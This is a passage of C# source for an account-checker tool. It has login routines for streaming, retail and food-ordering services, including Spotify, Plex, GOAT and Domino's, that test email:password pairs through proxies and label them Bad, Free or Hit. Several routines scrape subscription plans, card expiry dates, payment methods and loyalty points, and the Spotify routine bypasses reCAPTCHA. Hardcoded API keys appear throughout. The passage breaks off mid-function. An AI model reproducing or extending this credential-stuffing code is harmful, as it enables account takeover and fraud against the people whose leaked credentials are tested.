                        req.AddHeader("Referer", "https://de.pornhubpremium.com/premium/login");
                        HttpResponse res2 = req.Post(new Uri($"https://de.pornhubpremium.com/front/authenticate"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res2.ToString();
                        if (login.Contains("success\":\"0\""))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("\\/expired?") || login.Contains("\\/signup?") || login.Contains("premium_signup"))
                        {
                            return "Free";
                        }
                        else if (login.Contains(",\"premium_redirect_cookie\":\"1\",\"") || login.Contains("id=\"expiryDatePremium") || login.Contains("Next Billing Date") || login.Contains("success\":\"1\""))
                        {
                            return "Hit";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Napster
        static string Napster(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string acc = email + ":" + password;
                        string acc_encoded = Utils.Base64Encode(acc);

                        // Basic stuff, proxies, etc, you can see what id does above
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Pragma", "no-cache");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Authorization", "Basic WkRVMU1ETXpNekl0WlRNd055MDBZVGhpTFRobFltUXRaV1V3TmpCaVpUSmpORFptOk4yRTJaR1U0WWpJdE56STJNaTAwWVRoaUxXSTRPRFl0WW1FeU5EQXhaamt3TWpZdw==");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        HttpResponse toklog;
                        try
                        {
                            // We try to do the request, but don't put the raw website/post data, do it as I did it here: 
                            toklog = req.Post(new Uri($"https://api-web.napster.com/oauth/token"), new BytesContent(Encoding.Default.GetBytes("username=" + email + "&password=" + password + "&grant_type=password")));
                        }
                        catch
                        {
                            // If error then we continue in the loop (retrie)
                            Check.errors++;
                            continue;
                        }
                        string login = toklog.ToString();
                        if (login.Contains("Invalid password"))
                        {
                            // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                            return "Bad";
                        }
                        else if (login.Contains("access_token"))
                        {
                            string access_token = Parse(login, "access_token\":\"", "\"");
                            req.AddHeader("Authorization", "Bearer " + access_token);
                            HttpResponse subsreqbefore = req.Get("https://api-web.napster.com/me/account?napiAccessToken=" + access_token + "&rights=2");
                            string subsreq = subsreqbefore.ToString();
                            if (subsreq.Contains("\"subscription\":{\"id\":\"\""))
                            {
                                return "Free";

                            }
                            else if (subsreq.Contains("state\":\"EXPIRED"))
                            {
                                return "Free";
                            }
                            else
                            {
                                string premium_next_pay_date = Parse(subsreq, "productName\":\"", "\"");
                                return "Plan: " + premium_next_pay_date;
                            }
                        }
                        else if (login.Contains("No user found for "))
                        {
                            return "Bad";

                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region MyCanal
        static string MyCanal(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        if (!password.Any(char.IsUpper))
                        {
                            return "Bad";
                        }
                        else if (!password.Any(char.IsLower))
                        {
                            return "Bad";
                        }
                        else if (!password.Any(char.IsDigit))
                        {
                            return "Bad";
                        }
                        else if (password.Length < 7)
                        {
                            return "Bad";
                        }
                        else if (password.Length > 32)
                        {
                            return "Bad";
                        }
                        else
                        {
                            SetBasicRequestSettingsAndProxies(req);
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            req.AddHeader("Accept-Language", "en-us");
                            req.AddHeader("Connection", "keep-alive");
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("Host", "pass-api-v2.canal-plus.com");
                            req.AddHeader("User-Agent", "myCANAL/1183 CFNetwork/1107.1 Darwin/19.0.0");
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            string data = "vect=INTERNET&media=IOS%20PHONE&portailId=OQaRQJQkSdM.&distributorId=C22021&analytics=false&trackingPub=false&email=" + email + "&password=" + password;
                            HttpResponse res = req.Post(new Uri($"https://pass-api-v2.canal-plus.com/services/apipublique/login"), new BytesContent(Encoding.Default.GetBytes(data)));
                            string res_str = res.ToString();

                            if (res_str.Contains("Login ou mot de passe invalide") || res_str.Contains("Compte bloque"))
                            {
                                return "Bad";
                            }
                            else if (res_str.Contains("\"isSubscriber\":true,"))
                            {
                                string token = Parse(res_str, "passToken\":\"", "\",\"userData");
                                req.ClearAllHeaders();
                                req.AddHeader("Connection", "keep-alive");
                                req.AddHeader("Cookie", "s_token=" + token);
                                req.AddHeader("Host", "api-client.canal-plus.com");
                                req.AddHeader("User-Agent", "myCANAL/1202 CFNetwork/1121.2.2 Darwin/19.2.0");
                                HttpResponse res2 = req.Get(new Uri("https://api-client.canal-plus.com/self/persons/current/subscriptions"));
                                string cap = res2.ToString();
                                string startDate = Parse(cap, "startDate\":\"", "\",\"");
                                string endDate = Parse(cap, "endDate\":\"", "\",\"");
                                string Abonnement = Parse(cap, "ommercialLabel\":\"", "\"");
                                if (Abonnement == "ERROR")
                                {
                                    return $"Start Date: {startDate} | End Date: {endDate}";
                                }
                                return "Free";

                            }
                            else if (res_str.Contains("\"isSubscriber\":false,"))
                            {
                                return "Free";
                            }

                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion

        #region Goat
        static List<string> GoatUserAgents = new List<string>() { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1", "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" };
        static string GoatCheck(string login, string password)
        {

            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        CookieStorage cookies = new CookieStorage();
                        string userAgent = GoatUserAgents[new Random().Next(GoatUserAgents.Count)];
                        string csrf = GoatGetToken(ref cookies, userAgent);

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("x-csrf-token", csrf);
                        req.Referer = "https://www.goat.com/login";
                        req.Cookies = cookies;
                        req.UserAgent = userAgent;

                        string strResponse = req.Post(new Uri("https://www.goat.com/web-api/v1/login"), new BytesContent(Encoding.Default.GetBytes("{\"user\":{\"username\":\"" + login + "\",\"password\":\"" + password + "\"}}"))).ToString();

                        if (strResponse.Contains("{\"success\":true}"))
                        {
                            string token = cookies.GetCookies("https://www.goat.com")["jwt"].Value;
                            string capture = "";

                            for (int i2 = 0; i2 < Config.retries + 1; i2++)
                            {
                                capture = GoatGetCaptures(token, cookies);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Working - Capture Failed";

                            return capture;
                        }
                        else if (strResponse.Contains("{\"success\":false") || strResponse.Contains("\"messages\":[\"Your login information is not correct. Please try again.\"]"))
                        {
                            return "Bad";
                        }
                        Check.errors++;

                        continue;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }

        }
        static string GoatGetToken(ref CookieStorage cookies, string userAgent)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        cookies = new CookieStorage();
                        req.UserAgent = userAgent;
                        req.Cookies = cookies;

                        string strResponse = req.Get(new Uri("https://www.goat.com/login")).ToString();

                        return cookies.GetCookies("https://www.goat.com")["csrf"].Value;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
            return "";
        }
        static string GoatGetCaptures(string token, CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.Authorization = $"Token token=\"{token}\"";
                        req.AddHeader("x-emb-st", "1599328255931");
                        req.AddHeader("X-PX-AUTHORIZATION", "3");
                        req.AddHeader("Accept", "application/json");
                        req.UserAgent = "GOAT/2.34.1 (iPhone; iOS 13.2; Scale/3.00) Locale/en";
                        req.Cookies = cookies;

                        string strResponse = req.Get(new Uri($"https://www.goat.com/api/v1/billing_infos")).ToString();

                        if (strResponse.Contains("\"last4Digits\""))
                        {
                            string expYear = Regex.Match(strResponse, "\"cardExpYear\":(.*?),").Groups[1].Value;
                            string expMonth = Regex.Match(strResponse, "\"cardExpMonth\":(.*?),").Groups[1].Value;

                            return $"Has CC - Expiration Date: {expMonth}/{expYear}";
                        }
                        else if (strResponse.Contains("{\"billingInfos\":[]}"))
                        {
                            return "Free";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region WWE
        static string WWE(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    try
                    {
                        string acc = email + ":" + password;
                        string acc_encoded = Utils.Base64Encode(acc);

                        // Basic stuff, proxies, etc, you can see what id does above
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Realm", "dce.wwe");
                        req.AddHeader("x-api-key", "ef59c096-d95d-428e-ad94-86385070dde2");
                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse res = req.Post(new Uri($"https://dce-frontoffice.imggaming.com/api/v2/login"), new BytesContent(Encoding.Default.GetBytes("{\"id\":\"" + email + "\",\"secret\":\"" + password + "\"}")));
                        string login = res.ToString();
                        if (login.Contains("forbidden"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("authorisationToken"))
                        {
                            return "Hit";
                        }
                        else if (login.Contains("failedAuthentication"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("NOT_FOUND"))
                        {
                            return "Bad";
                        }
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }

                }
            }
        }
        #endregion

        #region EpixNow
        static string EpixNow(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string acc = email + ":" + password;
                    string acc_encoded = Utils.Base64Encode(acc);

                    SetBasicRequestSettingsAndProxies(req);
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Content-Type", "application/json");
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                    HttpResponse resp;
                    try
                    {
                        resp = req.Post(new Uri($"https://api.epixnow.com/v2/sessions"), new BytesContent(Encoding.Default.GetBytes("{\"device\":{\"guid\":\"b3425835-7d63-47b1-8a5a-6c2fa4e6d4f8\",\"format\":\"console\",\"os\":\"web\",\"display_width\":1180,\"display_height\":969,\"app_version\":\"1.0.2\",\"model\":\"browser\",\"manufacturer\":\"google\"},\"apikey\":\"53e208a9bbaee479903f43b39d7301f7\"}")));
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                    string toklogin = resp.ToString();
                    string token = Parse(toklogin, "\"session_token\":\"", "\",");
                    req.AddHeader("origin", "https://www.epixnow.com");
                    req.AddHeader("referer", "https://www.epixnow.com/login/");
                    req.AddHeader("accept", "application/json");
                    req.AddHeader("Content-Type", "application/json");
                    req.AddHeader("X-Session-Token", token);

                    HttpResponse res;
                    try
                    {
                        res = req.Post(new Uri($"https://api.epixnow.com/v2/epix_user_session"), new BytesContent(Encoding.Default.GetBytes("{\"user\":{\"email\":\"" + email + "\",\"password\":\"" + password + "\"}}")));
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                    string login = res.ToString();
                    if (login.Contains("Your email and password do not match."))
                    {
                        return "Bad";
                    }
                    else if (login.Contains("user_session"))
                    {
                        if (login.Contains("It looks like you're missing out! Subscribe and get unlimited access to exclusive shows, 1000s of movies and more."))
                        {
                            return "Free";

                        }
                        else
                        {
                            return "Hit";
                        }
                    }
                    else
                    {
                        continue;
                    }


                }
            }
        }
        #endregion

        #region DC Universe
        static string DCUniverse(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("x-consumer-key", "DA59dtVXYLxajktV");
                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse res = req.Post(new Uri($"https://www.dcuniverse.com/api/users/login"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + email + "\",\"password\":\"" + password + "\"}")));
                        string login = res.ToString();
                        if (login.Contains("406 Not Acceptable"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("session_id"))
                        {
                            string session_id = Parse(login, "\"session_id\": \"", "\",");
                            req.AddHeader("x-consumer-key", "DA59dtVXYLxajktV");
                            req.AddHeader("authorization", "Token " + session_id);
                            HttpResponse subsreqz = req.Get("https://www.dcuniverse.com/api/premium/2/subscriptions");
                            string subsreq = subsreqz.ToString();
                            if (subsreq.Contains("active\": false"))
                            {
                                return "Free";

                            }
                            else if (subsreq.Contains("active\": true"))
                            {
                                string premium_next_pay_date = Parse(subsreq, "\"premium_next_pay_date\": \"", "\",");
                                return "Next Pay Date = " + premium_next_pay_date;
                            }
                        }
                        else if (login.Contains("The email address or password is incorrect. Please try again"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("SORRY, THIS SERVICE IS ONLY AVAILABLE IN THE US. WE'LL ANNOUNCE WHEN IT IS AVAILABLE IN YOUR REGION."))
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Plex
        static string Plex(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string guidgenned = Guid.NewGuid().ToString();
                        HttpResponse res = req.Post(new Uri($"https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20SSO&X-Plex-Client-Identifier=" + guidgenned), new BytesContent(Encoding.Default.GetBytes("login=" + email + "&password=" + password + "&rememberMe=true")));
                        string login = res.ToString();
                        if (login.Contains("code\":1031"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("status\":\"Active"))
                        {
                            string premium_next_pay_date = Parse(login, "\"plan\":\"", "\",");
                            return "Plan = " + premium_next_pay_date;
                        }
                        else if (login.Contains("status\":\"Inactive"))
                        {
                            return "Free";
                        }
                        else if (login.Contains("code\":1001"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("code\":1003"))
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Spotify
        static string Spotify(string login, string password)
        {

            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        CookieStorage cookies = new CookieStorage();
                        string captchaResp = SpotifyGetCSRF(ref cookies);
                        string csrf = cookies.GetCookies("https://accounts.spotify.com")["csrf_token"].Value;

                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        //req.AddHeader("Cookie", "__bon=MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=;");
                        cookies.Add(new System.Net.Cookie("__bon", "MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=", "/", "accounts.spotify.com"));
                        req.Cookies = cookies;
                        req.Referer = "https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE";


                        HttpResponse res = req.Post(new Uri("https://accounts.spotify.com/login/password"), new BytesContent(Encoding.Default.GetBytes($"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username={login}&password={password}&recaptchaToken={captchaResp}&csrf_token={csrf}")));
                        string strResponse = res.ToString();
                        if (strResponse.Contains("\"result\":\"ok\""))
                        {
                            string capture = "";

                            for (int i2 = 0; i2 < Config.retries + 1; i2++)
                            {
                                capture = SpotifyGetCaptures(cookies);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Working - Capture Failed";

                            return capture;
                        }
                        else if (strResponse.Contains("errorInvalidCredentials"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        static string SpotifyGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";

                        string strResponse = req.Get(new Uri("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p")).ToString();
                        string token = Regex.Match(strResponse, "id=\"recaptcha-token\" value=\"(.*?)\"").Groups[1].Value;

                        req.AddHeader("Referer", "https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39");
                        string strResponse2 = req.Post(new Uri("https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39"), $"v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c={token}&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ", "application/x-www-form-urlencoded").ToString();

                        string respCatpcha = Regex.Match(strResponse2, "\\[\"rresp\",\"(.*?)\"").Groups[1].Value;

                        req.Get(new Uri("https://accounts.spotify.com/en/login")).ToString();

                        return respCatpcha;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        static string SpotifyGetCaptures(CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.Cookies = cookies;

                        string strResponse = req.Get(new Uri($"https://www.spotify.com/us/api/account/overview/")).ToString();

                        if (strResponse.Contains("\"name\":"))
                        {
                            string plan = Regex.Match(strResponse, "\"name\":\"(.*?)\"").Groups[1].Value;
                            string country = Regex.Match(strResponse, "\"Country\",\"value\":\"(.*?)\"").Groups[1].Value;
                            string paymentMethod = Regex.Match(strResponse, "{\"paymentMethod\":{\"name\":\"(.*?)\"").Groups[1].Value;
                            string username = Regex.Match(strResponse, "\":\"Username\",\"value\":\"(.*?)\"").Groups[1].Value;

                            if (plan.Contains("Spotify Free"))
                            {
                                return "Free";
                            }

                            return $"Plan: {plan} - Country: {country} - Payment Method: {paymentMethod} - Username: {username}";
                        }
                        break;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region Domino's
        static string Domino(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Accept", "application/x-www-form-urlencoded");
                        req.AddHeader("DPZ-Language", "en");
                        req.AddHeader("DPZ-Market", "UNITED_STATES");
                        req.AddHeader("User-Agent", "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)");
                        req.AddHeader("Connection", "Close");
                        req.AddHeader("X-DPZ-D", "608894e9d720cb54");
                        req.AddHeader("Host", "api.dominos.com");
                        req.AddHeader("Accept-Encoding", "gzip");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string data = $"grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username={email}&password={password}";
                        HttpResponse res = req.Post(new Uri("https://authproxy.dominos.com/auth-proxy-service/token.oauth2"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();

                        if (login.Contains("Invalid username & password combination") || login.Contains("invalid_grant"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("access_token") || login.Contains("eyJ"))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(login);

                            string token = jsonObj["access_token"].ToString();
                            req.ClearAllHeaders();

                            req.AddHeader("Accept", "application/x-www-form-urlencoded");
                            req.AddHeader("Authorization", "Bearer " + token);
                            req.AddHeader("User-Agent", "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)");
                            req.AddHeader("X-DPZ-D", "608894e9d720cb54");
                            req.AddHeader("Host", "order.dominos.com");
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            HttpResponse res2 = req.Post(new Uri("https://order.dominos.com/power/login"));
                            string res2_str = res2.ToString();

                            JObject jsonobj2 = (JObject)JsonConvert.DeserializeObject(res2_str);

                            string customer_id = jsonobj2["CustomerID"].ToString();

                            req.ClearAllHeaders();

                            req.AddHeader("Accept", "text/plain, application/json, application/json, text/plain, */*");
                            req.AddHeader("DPZ-Language", "en");
                            req.AddHeader("DPZ-Market", "UNITED_STATES");
                            req.AddHeader("Authorization", "Bearer " + token);
                            req.AddHeader("User-Agent", "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)");
                            req.AddHeader("Connection", "Close");
                            req.AddHeader("X-DPZ-D", "608894e9d720cb54");
                            req.AddHeader("Host", "order.dominos.com");
                            req.AddHeader("Accept-Encoding", "gzip");


                            string capture = req.Get(new Uri("https://order.dominos.com/power/customer/" + customer_id + "/loyalty")).ToString();
                            try
                            {
                                JObject jsonxd = (JObject)JsonConvert.DeserializeObject(capture);

                                string points = jsonxd["VestedPointBalance"].ToString();

                                if (points == "0")
                                {
                                    return "Free";
                                }
                                else
